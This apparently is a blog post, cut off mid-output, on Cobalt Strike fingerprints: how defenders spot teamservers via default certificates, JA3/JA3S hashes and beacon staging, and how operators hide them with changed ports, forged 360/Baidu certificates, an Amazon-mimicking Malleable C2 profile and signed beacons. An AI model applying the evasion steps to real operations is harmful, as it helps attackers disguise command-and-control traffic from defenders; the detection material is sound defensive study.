    <id>http://www.ol4three.com/2021/10/28/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/CobaltStrike/Cobalt-Strike%E7%89%B9%E5%BE%81%E9%9A%90%E8%97%8F%E4%B8%8E%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/</id>
    <published>2021-10-28T08:22:53.000Z</published>
    <updated>2021-11-23T12:04:31.541Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Cobalt-Strike简介"><a href="#Cobalt-Strike简介" class="headerlink" title="Cobalt Strike简介"></a>Cobalt Strike简介</h1><p>Cobalt Strike is software for Adversary Simulations and Red Team Operations. Cobalt Strike 简称CS， <a href="https://blog.ateam.qianxin.com/CobaltStrike4.0用户手册_中文翻译.pdf">A-team详细介绍使用网址</a>。CS是一款优秀的后渗透工具，可以在获取主机权限后进行长久权限维持，快速进行内网提权，凭据导出等。在后渗透中如果未修改特征，容易被流量审计设备监控，被蓝队溯源。</p><p>Cobalt Strike 是一个为对手模拟和红队行动而设计的平台，主要用于执行有目标的攻击和模拟高级威胁 者的后渗透行动。本章中会概述 Cobalt Strike 的功能集和相关的攻击流程。在本手册的剩余部分中会 详细的讨论这些功能。</p><a id="more"></a><h1 id="Cobalt-Strike的特征"><a href="#Cobalt-Strike的特征" class="headerlink" title="Cobalt Strike的特征"></a>Cobalt Strike的特征</h1><p>teamserver主控端使用的加密证书</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">root@kali:~&#x2F;桌面&#x2F;cobaltstrike4.0# ls -l</span><br><span class="line">总用量 27748</span><br><span class="line">-rwxrw-rw- 1 root root      126 12月  5  2019 agscript</span><br><span class="line">-rwxrw-rw- 1 root root      144 12月  5  2019 c2lint</span><br><span class="line">-rwxrw-rw- 1 root root      256 1月  25  2020 cobaltstrike.auth</span><br><span class="line">-rwxrw-rw- 1 root root   785468 3月  15  2019 CobaltstrikeCN.jar</span><br><span class="line">-rwxrw-rw- 1 root root 27487620 3月  20  2020 cobaltstrike.jar</span><br><span class="line">-rwxrw-rw- 1 root root     2315 3月  17  2019 cobaltstrike.store</span><br><span class="line">-rwxrw-rw- 1 root root    96104 12月  5  2019 icon.jpg</span><br><span class="line">-rwxrw-rw- 1 root root      141 12月  5  2019 peclone</span><br><span class="line">-rwxrw-rw- 1 root root      141 3月  19  2020 start.bat</span><br><span class="line">-rwxrw-rw- 1 root root      108 3月  19  2020 start.sh</span><br><span class="line">-rwxrw-rw- 1 root root     1865 3月  19  2020 teamserver</span><br><span class="line">-rwxrw-rw- 1 root root     2005 3月  19  2020 teamserver.bat</span><br><span class="line">drwxr-xr-x 2 root root     4096 10月 13 14:41 third-party</span><br></pre></td></tr></table></figure><p>这里的cobalstrike.store里面的证书是用来teamserver主控端使用的加密证书(默认端口50050)，而不是主机上线的时候使用的</p><p>特征很容易看到</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">keytool -list -v -keystore cobaltstrike.store</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211028162530859.png" alt="image-20211028162530859"></p><p>我们去fofa进行搜索可以发现大量服务端机器</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">port&#x3D;&quot;50050&quot; &amp;&amp; cert&#x3D;&quot;cobaltstrike&quot;</span><br></pre></td></tr></table></figure><p>![image-20211028162701322](../../../../../../Library/Application Support/typora-user-images/image-20211028162701322.png)</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211028162745166.png" alt="image-20211028162745166"></p><p>我们也可以使用指纹来查询哪些是cobaltStrike的服务器，下面是4.0的证书指纹</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211028162818883.png" alt="image-20211028162818883"></p><p>可以到censys去查询该证书</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">7B49FC589E7E738E3457859D269996ECEF83F693570B0AC482C426B1FA04BD73</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211028162903879.png" alt="image-20211028162903879"></p><p>也可以查看使用此证书的主机</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211028162934208.png" alt="image-20211028162934208"></p><h1 id="去除特征的几种方法"><a href="#去除特征的几种方法" class="headerlink" title="去除特征的几种方法"></a>去除特征的几种方法</h1><h2 id="修改默认端口号"><a href="#修改默认端口号" class="headerlink" title="修改默认端口号"></a>修改默认端口号</h2><p>第一种是直接编辑teamserver进行启动项修改。./teamserver 1.1.1.1 password 直接修改teamserver vim teamserver</p><p>编辑teamserver文件 搜索server_port</p><p>修改端口为12345</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211028163024781.png" alt="image-20211028163024781"></p><p>再次访问发现端口已经修改</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211028163051513.png" alt="image-20211028163051513"></p><h2 id="修改默认SSL证书"><a href="#修改默认SSL证书" class="headerlink" title="修改默认SSL证书"></a>修改默认SSL证书</h2><p>存在的特征，需要重新创建一个新的不一样的证书。</p><p>使用以下命令创建证书</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">keytool -keystore cobaltstrike.store -storepass 密码 -keypass 密码 </span><br><span class="line">-genkey -keyalg RSA -alias google.com -dname &quot;CN&#x3D;(名字与姓氏),</span><br><span class="line"> OU&#x3D;(组织单位名称), O&#x3D;(组织名称), L&#x3D;(城市或区域名称), </span><br><span class="line"> ST&#x3D;(州或省份名称), C&#x3D;(单位的两字母国家代码)&quot;</span><br></pre></td></tr></table></figure><p>比如修改为百度或者360</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">360</span><br><span class="line">keytool -keystore cobaltstrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias 360.com -dname &quot;CN&#x3D;US, OU&#x3D;360.com, O&#x3D;Sofaware, L&#x3D;Somewhere, ST&#x3D;Cyberspace, C&#x3D;CN&quot;</span><br><span class="line"></span><br><span class="line">baidu</span><br><span class="line">keytool -keystore cobaltStrike.store -storepass 123456 -keypass 123456 -genkey -keyalg RSA -alias baidu.com -dname &quot;CN&#x3D;ZhongGuo, OU&#x3D;CC, O&#x3D;CCSEC, L&#x3D;BeiJing, ST&#x3D;ChaoYang, C&#x3D;CN&quot;</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211028163409229.png" alt="image-20211028163409229"></p><p>再次运行发现 证书已经改变特征已经为360公司</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211028163438037.png" alt="image-20211028163438037"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211028163540010.png" alt="image-20211028163540010"></p><h2 id="HTTP流量"><a href="#HTTP流量" class="headerlink" title="HTTP流量"></a>HTTP流量</h2><p>在使用Cobalt Strike HTTP进行对应通信的时候，我们使用wireshark来抓取HTTP协议。包括请求的固定地址，请求头等等。可以看到一些固定的请求信息特征可以查看到。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211110173257064.png" alt="image-20211110173257064"></p><p>对应的Malleable-C2-Profiles配置文件由此而来，它允许我们仅通过一个简单的配置文件来改变Beacon和cobaltstrike通信时的流量特征和行为。</p><p><a href="https://github.com/rsmudge/Malleable-C2-Profiles">https://github.com/rsmudge/Malleable-C2-Profiles</a></p><p>在github上有师傅给出了一些APT 和正常厂商对应行为的配置文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">set sleeptime &quot;5000&quot;;</span><br><span class="line">set jitter    &quot;0&quot;;</span><br><span class="line">set maxdns    &quot;255&quot;;</span><br><span class="line">set useragent &quot;Mozilla&#x2F;5.0 (Windows NT 6.1; WOW64; Trident&#x2F;7.0; rv:11.0) like Gecko&quot;;</span><br><span class="line"></span><br><span class="line">http-get &#123;</span><br><span class="line"></span><br><span class="line">    set uri &quot;&#x2F;s&#x2F;ref&#x3D;nb_sb_noss_1&#x2F;167-3294888-0262949&#x2F;field-keywords&#x3D;books&quot;;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line"></span><br><span class="line">        header &quot;Accept&quot; &quot;*&#x2F;*&quot;;</span><br><span class="line">        header &quot;Host&quot; &quot;www.amazon.com&quot;;</span><br><span class="line"></span><br><span class="line">        metadata &#123;</span><br><span class="line">            base64;</span><br><span class="line">            prepend &quot;session-token&#x3D;&quot;;</span><br><span class="line">            prepend &quot;skin&#x3D;noskin;&quot;;</span><br><span class="line">            append &quot;csm-hit&#x3D;s-24KU11BB82RZSYGJ3BDK|1419899012996&quot;;</span><br><span class="line">            header &quot;Cookie&quot;;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line"></span><br><span class="line">        header &quot;Server&quot; &quot;Server&quot;;</span><br><span class="line">        header &quot;x-amz-id-1&quot; &quot;THKUYEZKCKPGY5T42PZT&quot;;</span><br><span class="line">        header &quot;x-amz-id-2&quot; &quot;a21yZ2xrNDNtdGRsa212bGV3YW85amZuZW9ydG5rZmRuZ2tmZGl4aHRvNDVpbgo&#x3D;&quot;;</span><br><span class="line">        header &quot;X-Frame-Options&quot; &quot;SAMEORIGIN&quot;;</span><br><span class="line">        header &quot;Content-Encoding&quot; &quot;gzip&quot;;</span><br><span class="line"></span><br><span class="line">        output &#123;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">http-post &#123;</span><br><span class="line">    </span><br><span class="line">    set uri &quot;&#x2F;N4215&#x2F;adj&#x2F;amzn.us.sr.aps&quot;;</span><br><span class="line"></span><br><span class="line">    client &#123;</span><br><span class="line"></span><br><span class="line">        header &quot;Accept&quot; &quot;*&#x2F;*&quot;;</span><br><span class="line">        header &quot;Content-Type&quot; &quot;text&#x2F;xml&quot;;</span><br><span class="line">        header &quot;X-Requested-With&quot; &quot;XMLHttpRequest&quot;;</span><br><span class="line">        header &quot;Host&quot; &quot;www.amazon.com&quot;;</span><br><span class="line"></span><br><span class="line">        parameter &quot;sz&quot; &quot;160x600&quot;;</span><br><span class="line">        parameter &quot;oe&quot; &quot;oe&#x3D;ISO-8859-1;&quot;;</span><br><span class="line"></span><br><span class="line">        id &#123;</span><br><span class="line">            parameter &quot;sn&quot;;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        parameter &quot;s&quot; &quot;3717&quot;;</span><br><span class="line">        parameter &quot;dc_ref&quot; &quot;http%3A%2F%2Fwww.amazon.com&quot;;</span><br><span class="line"></span><br><span class="line">        output &#123;</span><br><span class="line">            base64;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    server &#123;</span><br><span class="line"></span><br><span class="line">        header &quot;Server&quot; &quot;Server&quot;;</span><br><span class="line">        header &quot;x-amz-id-1&quot; &quot;THK9YEZJCKPGY5T42OZT&quot;;</span><br><span class="line">        header &quot;x-amz-id-2&quot; &quot;a21JZ1xrNDNtdGRsa219bGV3YW85amZuZW9zdG5rZmRuZ2tmZGl4aHRvNDVpbgo&#x3D;&quot;;</span><br><span class="line">        header &quot;X-Frame-Options&quot; &quot;SAMEORIGIN&quot;;</span><br><span class="line">        header &quot;x-ua-compatible&quot; &quot;IE&#x3D;edge&quot;;</span><br><span class="line"></span><br><span class="line">        output &#123;</span><br><span class="line">            print;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>通过c2lint来检测该文件</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ .&#x2F;c2lint amazon.profile</span><br><span class="line"></span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line">default</span><br><span class="line">&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">http-get</span><br><span class="line">--------</span><br><span class="line">GET &#x2F;s&#x2F;ref&#x3D;nb_sb_noss_1&#x2F;167-3294888-0262949&#x2F;field-keywords&#x3D;books HTTP&#x2F;1.1</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Host: www.amazon.com</span><br><span class="line">Cookie: skin&#x3D;noskin;session-token&#x3D;lCZcYm9qlpy8hT41NUthoA&#x3D;&#x3D;csm-hit&#x3D;s-24KU11BB82RZSYGJ3BDK|1419899012996</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 6.1; WOW64; Trident&#x2F;7.0; rv:11.0) like Gecko</span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Server: Server</span><br><span class="line">x-amz-id-1: THKUYEZKCKPGY5T42PZT</span><br><span class="line">x-amz-id-2: a21yZ2xrNDNtdGRsa212bGV3YW85amZuZW9ydG5rZmRuZ2tmZGl4aHRvNDVpbgo&#x3D;</span><br><span class="line">X-Frame-Options: SAMEORIGIN</span><br><span class="line">Content-Encoding: gzip</span><br><span class="line">Content-Length: 64</span><br><span class="line"></span><br><span class="line">*..[..6..8...Q|?...,V...Md...f..m.8y.....f.E...Ho..pOy....C..&#123;^.</span><br><span class="line"></span><br><span class="line">http-post</span><br><span class="line">---------</span><br><span class="line">POST &#x2F;N4215&#x2F;adj&#x2F;amzn.us.sr.aps?sz&#x3D;160x600&amp;oe&#x3D;oe&amp;sn&#x3D;24791&amp;s&#x3D;3717&amp;dc_ref&#x3D;http%3A%2F%2Fwww.amazon.com HTTP&#x2F;1.1</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Content-Type: text&#x2F;xml</span><br><span class="line">X-Requested-With: XMLHttpRequest</span><br><span class="line">Host: www.amazon.com</span><br><span class="line">Content-Length: 24</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Windows NT 6.1; WOW64; Trident&#x2F;7.0; rv:11.0) like Gecko</span><br><span class="line"></span><br><span class="line">29Mivrcb3fH6Gw0cZioEMA&#x3D;&#x3D;</span><br><span class="line"></span><br><span class="line">HTTP&#x2F;1.1 200 OK</span><br><span class="line">Server: Server</span><br><span class="line">x-amz-id-1: THK9YEZJCKPGY5T42OZT</span><br><span class="line">x-amz-id-2: a21JZ1xrNDNtdGRsa219bGV3YW85amZuZW9zdG5rZmRuZ2tmZGl4aHRvNDVpbgo&#x3D;</span><br><span class="line">X-Frame-Options: SAMEORIGIN</span><br><span class="line">x-ua-compatible: IE&#x3D;edge</span><br><span class="line">Content-Length: 0</span><br></pre></td></tr></table></figure><p>可以看到我们对应的伪造请求，再次启动teamserver，抓取对应流量包</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211110173336803.png" alt="image-20211110173336803"></p><p>我们可以看到对应的特征信息已经修改</p><h2 id="HTTPS流量"><a href="#HTTPS流量" class="headerlink" title="HTTPS流量"></a>HTTPS流量</h2><p>对于HTTPS流量我们是们Wireshark进行抓取</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211110175624766.png" alt="image-20211110175624766"></p><p>我们可以找到对应的证书数据包，导出对应的分组字节流, <code>Export selected Packet Bytes</code></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211110180152205.png" alt="image-20211110180152205"></p><p>计算证书的SHA256值，并在censys.io进行搜索</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ sha256sum https.cer                                                                         </span><br><span class="line">87f2085c32b6a2cc709b365f55873e207a9caa10bffecf2fd16d3cf9d94d390c  https.cer</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211110181534376.png" alt="image-20211110181534376"></p><p>可以看到使用该默认证书的主机</p><p>同时在Client Hello数据包中同样也存在</p><blockquote><p>TLS客户端进行指纹识别的思想，最初来自于<a href="https://twitter.com/synackpse">Lee Brotherston</a>于2015年的一项研究成果，对这项研究感兴趣的读者可以参阅<a href="https://blog.squarelemon.com/tls-fingerprinting/">这里</a>；与该思想相关的DerbyCon演讲可以参阅<a href="https://www.youtube.com/watch?v=XX0FRAy2Mec">这里</a>。</p><p>我们知道，不仅”良性的”应用程序会使用TLS及其前身SSL对其流量进行加密，而且恶意软件也常常这样做；前者这样做的目的是确保数据安全，而后者这样做的目的则是将其流量隐藏在噪声中。为了启动TLS会话，客户端将在TCP 3次握手后发送TLS客户端的Hello数据包。这个数据包及其生成方式取决于构建客户端应用程序时所使用的软件包和方法。如果接受TLS连接，服务器将使用基于服务器端库和配置以及Client Hello消息中的详细信息创建的TLS Server Hello数据包进行响应。由于TLS协商是以明文的方式传输的，所以，我们可以使用TLS Client Hello数据包中的详细信息对客户端应用程序进行指纹识别。</p><p>JA3 这个项目用于收集Client Hello数据包中以下字段的十进制值：包括版本、可接受的密码、扩展列表、椭圆曲线密码和椭圆曲线密码格式。然后，用<code>,</code>来分隔各个字段、用<code>-</code>来分隔各个字段中的各个值，将这些值串联在一起之后，计算 <code>MD5</code>，就是一个ja3。如果没有某个字段，则这些字段的值为空。</p></blockquote><p>字段顺序如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TLSVersion，Ciphers，Extensions，EllipticCurves，EllipticCurvePointFormats</span><br></pre></td></tr></table></figure><p>第一字段TLSVersion</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211111114925058.png" alt="image-20211111114925058"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x0303-&gt;771</span><br></pre></td></tr></table></figure><p>第二个字段Ciphers总共19个</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211111115342676.png" alt="image-20211111115342676"></p><p>将对应的数值进行转化</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0xc02c-&gt;49196</span><br><span class="line">0xc02b-&gt;49195</span><br><span class="line">0xc030-&gt;49200</span><br><span class="line">49196-49195-49200-49199-49188-49187-49192-49191-49162-49161-49172-49171-157-156-61-60-53-47-10</span><br></pre></td></tr></table></figure><p>第三个字段Extensions</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211111115749306.png" alt="image-20211111115749306"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">5-10-11-13-35-23-65281</span><br></pre></td></tr></table></figure><p>第四个字段：EllipticCurves</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211111120033782.png" alt="image-20211111120033782"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0x1d-&gt;29, 0x17-&gt;23, 0x18-&gt;24</span><br><span class="line">29-23-24</span><br></pre></td></tr></table></figure><p>第五个字段：EllipticCurvePointFormats</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211111120208129.png" alt="image-20211111120208129"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0</span><br></pre></td></tr></table></figure><p>将五个字段用<code>,</code>拼接如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">771,49196-49195-49200-49199-49188-49187-49192-49191-49162-49161-49172-49171-157-156-61-60-53-47-10,5-10-11-13-35-23-65281,29-23-24,0</span><br></pre></td></tr></table></figure><p>做MD5加密如下：</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">In [1]: import hashlib</span><br><span class="line"></span><br><span class="line">In [2]: hashlib.md5((&#39;771,49196-49195-49200-49199-49188-49187-49192-49191-49162-49161-49172-49171-157-156-61-60-53-47-10,5-10-11-13-35-23-65281,29-23-24,0&#39;).encode(encoding&#x3D;&quot;utf-8&quot;)).hexdigest()</span><br><span class="line">Out[2]: &#39;72a589da586844d7f0818ce684948eea&#39;</span><br></pre></td></tr></table></figure><p>也可以使用对应的脚本直接进行解密</p><p><a href="https://github.com/salesforce/ja3">https://github.com/salesforce/ja3</a></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ python ja3.py ~&#x2F;Documents&#x2F;0.OL4THREE&#x2F;HTTPS-WIN10.pcapng</span><br><span class="line">[10.17.21.136:443] JA3: 771,49196-49195-49200-49199-49188-49187-49192-49191-49162-49161-49172-49171-157-156-61-60-53-47-10,5-10-11-13-35-23-65281,29-23-24,0 --&gt; 72a589da586844d7f0818ce684948eea</span><br><span class="line">[10.17.21.136:443] JA3: 771,49196-49195-49200-49199-49188-49187-49192-49191-49162-49161-49172-49171-157-156-61-60-53-47-10,5-10-11-13-35-23-65281,29-23-24,0 --&gt; 72a589da586844d7f0818ce684948eea</span><br><span class="line">[10.17.21.136:443] JA3: 771,49196-49195-49200-49199-49188-49187-49192-49191-49162-49161-49172-49171-157-156-61-60-53-47-10,5-10-11-13-35-23-65281,29-23-24,0 --&gt; 72a589da586844d7f0818ce684948eea</span><br></pre></td></tr></table></figure><p>对比 <a href="https://links.jianshu.com/go?to=https%3A%2F%2Fgithub.com%2FByteSecLabs%2Fja3-ja3s-combo%2Fblob%2Fmaster%2Fmaster-list.txt">https://github.com/ByteSecLabs/ja3-ja3s-combo/blob/master/master-list.txt</a> 可证实是CobaltStrike的ja3指纹</p><p>同样的我们也可以去计算下服务端的ja3s</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">╰─$ python ja3s.py ~&#x2F;Documents&#x2F;0.OL4THREE&#x2F;HTTPS-WIN10.pcapng</span><br><span class="line">[192.168.72.177:1667] JA3S: 771,CipherSuite(TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384),23-35-65281 --&gt; f9a2073be9cd81e756f9c3ab50ba9bd1</span><br><span class="line">[192.168.72.177:1668] JA3S: 771,CipherSuite(TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384),23-35-65281 --&gt; f9a2073be9cd81e756f9c3ab50ba9bd1</span><br><span class="line">[192.168.72.177:1669] JA3S: 771,CipherSuite(TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384),23-35-65281 --&gt; f9a2073be9cd81e756f9c3ab50ba9bd1</span><br></pre></td></tr></table></figure><blockquote><p>MetaSploit 的 Meterpreter 和 CobaltStrike（并非4.1版本） 的 Beacon 都使用 Windows 套接字来启动 TLS 通信。在 Windows 10 上，JA3=72a589da586844d7f0818ce684948eea（指定 IP 地址），JA3=a0e9f5d64349fb13191bc781f81f42e1（指定域名）。由于 Windows 上的其他普普通通的应用程序也使用相同的套接字，因此，我们很难识别其中的恶意通信。但是，Kali Linux 上的 C2 服务器对该客户端应用程序的响应方式与 Internet 上的普通服务器对该套接字的响应方式相比来说是独一无二的。尽管服务器对不同客户端的响应不同，但它们对同一客户端的响应总是一致的。因此，如果结合 ja3+ja3s，就能够识别这种恶意通信，而不用考虑目的地 IP、域名或证书等细节信息。</p><p>JA3和JA3S是一种基于TLS指纹的安全分析方法。JA3指纹能够指示客户端应用程序通过TLS通信的方式，而JA3指纹能够指示服务器响应。如果两者结合起来，实质上就生成了客户端和服务器之间的加密协商的指纹。虽然基于TLS的检测方法不一定是灵丹妙药，也不一定能保证映射到客户端应用程序，但它们始终是安全分析的轴心所在。</p></blockquote><p>所以对于HTTPS证书特征，建议一定要修改默认的HTTPS证书，重新申请一个HTTPS证书，</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211111151224222.png" alt="image-20211111151224222"></p><p>之后会生成对应的TXT记录，复制进对应的DNS域名管理，解析后下载文件。</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211111151350019.png" alt="image-20211111151350019"></p><p>之后会得到full_chain.pem证书和private私钥两个文件。上传至cobalt strike文件夹下，使用keytool重新创建证书</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211111171130139.png" alt="image-20211111171130139"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211111171206190.png" alt="image-20211111171206190"></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">openssl pkcs12 -export -in full_chain.pem -inkey private.key -out Wings.p12 -name Wings -passout pass:wings123456</span><br><span class="line"></span><br><span class="line">keytool -importkeystore -deststorepass wings123456 -destkeypass ccc123456 -destkeystore wings.store -srckeystore Wings.p12 -srcstoretype PKCS12 -srcstorepass wings123456 -alias Wings</span><br><span class="line"></span><br><span class="line">keytool -importkeystore -deststorepass wings123456 -destkeypass ccc123456 -destkeystore wings.jks -srckeystore Wings.p12 -srcstoretype PKCS12 -srcstorepass wings123456 -alias Wings</span><br></pre></td></tr></table></figure><p>创建后，在profile配置文件中，添加</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">https-certificate &#123;</span><br><span class="line">    set keystore &quot;wings.store&quot;;</span><br><span class="line">    set password &quot;wings123456&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>同时将teamserver中修改调用的store和对应的密码，进行启动发现证书已经修改</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211111184234913.png" alt="image-20211111184234913"></p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211111184332351.png" alt="image-20211111184332351"></p><p>在生成可执行文件时，点击Sign executable file 进行勾选</p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211112165849625.png" alt="image-20211112165849625" style="zoom:50%;"><p>再次抓取流量进行分析</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211112170016737.png" alt="image-20211112170016737"></p><p>发现证书信息已经修改</p><h2 id="Beacon-Staging-特征"><a href="#Beacon-Staging-特征" class="headerlink" title="Beacon Staging 特征"></a>Beacon Staging 特征</h2><p>在cobalt strike 上线的时候，首先投递一个被称为stager的小巧payload，然后去beacon staging server下载体积较大更复杂的stage。具体细节不是很明白。<br>通过访问默认的uri就可以获取到cobalt strike 的shellcode。有师傅已经写好了<code>grab_beacon_config.nse</code>脚本来识别beacon staging的特征。</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">nmap xxx.xxx.xxx.xxx --script&#x3D;grab_beacon_config.nse</span><br></pre></td></tr></table></figure><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211112154717717.png" alt="image-20211112154717717"></p><p>当CobaltStrike的stager在受害端运行时，会请求TeamServer端拉取Beacon进行在内存中反射注入运行，先运行stage，打开wireshark抓包</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211112162211687.png" alt="image-20211112162211687"></p><p>可以看到受害段访问teamserver <a href="http://192.168.137.94/EuNU">http://192.168.137.94/EuNU</a></p><p>访问并下载对应脚本</p><p><img src="https://oss-map.oss-cn-beijing.aliyuncs.com/img/image-20211112162549739.png" alt="image-20211112162549739"></p><p>然后通过脚本对stager进行解密</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import sys,struct</span><br><span class="line"></span><br><span class="line">filename &#x3D; sys.argv[1]</span><br><span class="line">data &#x3D; open(filename, &#39;rb&#39;).read()</span><br><span class="line">t &#x3D; bytearray(data[0x45:])</span><br><span class="line">(a,b) &#x3D; struct.unpack_from(&#39;&lt;II&#39;, t)</span><br><span class="line">key &#x3D; a</span><br><span class="line">t2 &#x3D; t[8:]</span><br><span class="line">out &#x3D; &quot;&quot;</span><br><span class="line">for i in range(len(t2)&#x2F;4):</span><br><span class="line">    temp &#x3D; struct.unpack_from(&#39;&lt;I&#39;, t2[i*4:])[0]</span><br><span class="line">    temp ^&#x3D; key</span><br><span class="line">    out +&#x3D; struct.pack(&#39;&lt;I&#39;, temp)</span><br><span class="line">    key ^&#x3D; temp</span><br><span class="line">open(filename+&#39;.decoded&#39;, &#39;wb&#39;).write(out)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python decostager.py EuNU</span><br></pre></td></tr></table></figure><p>然后多出来一个EuNU.decoded文件，之后我们利用如下脚本可以解析出对应的配置信息</p><p><a href="https://github.com/Sentinel-One/CobaltStrikeParser">https://github.com/Sentinel-One/CobaltStrikeParser</a></p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">$ python3 ..&#x2F;CobaltStrikeParser-master&#x2F;parse_beacon_config.py EuNU.decoded</span><br><span class="line">BeaconType                       - HTTP</span><br><span class="line">Port                             - 80</span><br><span class="line">SleepTime                        - 5000</span><br><span class="line">MaxGetSize                       - 1048576</span><br><span class="line">Jitter                           - 0</span><br><span class="line">MaxDNS                           - 255</span><br><span class="line">PublicKey_MD5                    - defb5d95ce99e1ebbf421a1a38d9cb64</span><br><span class="line">C2Server                         - 192.168.137.94,&#x2F;s&#x2F;ref&#x3D;nb_sb_noss_1&#x2F;167-3294888-0262949&#x2F;field-keywords&#x3D;books</span><br><span class="line">UserAgent                        - Mozilla&#x2F;5.0 (Windows NT 6.1; WOW64; Trident&#x2F;7.0; rv:11.0) like Gecko</span><br><span class="line">HttpPostUri                      - &#x2F;N4215&#x2F;adj&#x2F;amzn.us.sr.aps</span><br><span class="line">Malleable_C2_Instructions        - Empty</span><br><span class="line">HttpGet_Metadata                 - ConstHeaders</span><br><span class="line">                                   Accept: *&#x2F;*</span><br><span class="line">                                   Host: www.amazon.com</span><br><span class="line">                                   Metadata</span><br><span class="line">                                   base64</span><br><span class="line">                                   prepend &quot;session-token&#x3D;&quot;</span><br><span class="line">                                   prepend &quot;skin&#x3D;noskin;&quot;</span><br><span class="line">                                   append &quot;csm-hit&#x3D;s-24KU11BB82RZSYGJ3BDK|1419899012996&quot;</span><br><span class="line">                                   header &quot;Cookie&quot;</span><br><span class="line">HttpPost_Metadata                - 